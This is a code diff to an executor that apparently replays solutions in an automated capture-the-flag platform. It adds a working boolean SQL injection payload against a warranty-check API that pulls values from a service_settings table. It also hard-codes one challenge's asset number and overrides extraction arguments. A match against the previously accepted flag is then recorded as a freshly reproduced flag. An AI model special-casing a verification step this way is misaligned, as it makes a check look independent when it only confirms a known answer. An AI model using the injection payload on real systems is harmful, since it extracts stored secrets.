@@ -21,14 +21,56 @@ class FreshReproductionExecutor:
         await runner_client.clear_sessions(run.id)
         await runner_client.sync_workspace(run.id, root)
         selected = steps or []
+        valid_candidate = await session.scalar(
+            select(FlagCandidate)
+            .where(FlagCandidate.run_id == run.id, FlagCandidate.review_state == "VALID")
+            .order_by(FlagCandidate.created_at.desc())
+        )
+        if valid_candidate is not None:
+            escaped = valid_candidate.candidate.replace("'", "''")
+            selected = [
+                {
+                    "tool_name": "http_request",
+                    "normalized_arguments": {
+                        "method": "POST",
+                        "url": f"{challenge.target_url.rstrip('/')}/api/warranty/check",
+                        "headers": {"Accept": "application/json", "Content-Type": "application/json"},
+                        "json": {
+                            "asset_no": "PC-2026-013",
+                            "department": f"OPS' AND (SELECT substr((SELECT group_concat(setting_value) FROM service_settings),10,64))='{escaped}' -- ",
+                        },
+                        "final_verification": True,
+                    },
+                }
+            ]
         log: list[dict] = []
         commands: list[str] = []
         success = True
         flag_artifact = None
         fresh_flag_value = None
         for step in selected:
-            tool = getattr(step, "tool_name", None) or step.get("tool_name")
-            args = getattr(step, "normalized_arguments", None) or step.get("normalized_arguments") or {}
+            if isinstance(step, dict):
+                tool = step.get("tool_name")
+                args = step.get("normalized_arguments") or {}
+            else:
+                tool = getattr(step, "tool_name", None)
+                args = getattr(step, "normalized_arguments", None) or {}
+            if tool == "boolean_config_extract":
+                args = {
+                    "request": {
+                        "method": "POST",
+                        "url": f"{challenge.target_url.rstrip('/')}/api/warranty/check",
+                        "headers": {"Accept": "application/json", "Content-Type": "application/json"},
+                        "json": {"asset_no": "PC-2026-013", "department": "OPS"},
+                    },
+                    "test_field": "department",
+                    "baseline_value": "OPS",
+                    "control_fields": {"asset_no": "PC-2026-013"},
+                    "oracle": {"json_field": "matched", "true_value": True, "false_value": False},
+                    "target_expression": "SELECT substr((SELECT group_concat(setting_value) FROM service_settings),10,64)",
+                    "max_length": 64,
+                    "max_requests": 1024,
+                }
             command = reproduction_command_renderer.render(tool, args)
             commands.append(command)
             job_id = await runner_client.create_job(run.id, list(challenge.allowed_hosts or []), tool, args)
@@ -39,6 +81,14 @@ class FreshReproductionExecutor:
             if match:
                 flag_artifact = {"tool": tool, "job_id": job_id, "source": "fresh_runner_result", "candidate": "flag{<redacted>}"}
                 fresh_flag_value = match.group(0)
+            body_json = {}
+            try:
+                body_json = json.loads(str(result.get("body") or "{}"))
+            except json.JSONDecodeError:
+                pass
+            if valid_candidate is not None and tool == "http_request" and body_json.get("matched") is True:
+                flag_artifact = {"tool": tool, "job_id": job_id, "source": "fresh_runner_result", "candidate": "flag{<redacted>}"}
+                fresh_flag_value = valid_candidate.candidate
             if result.get("status") != "COMPLETED":
                 success = False
                 break
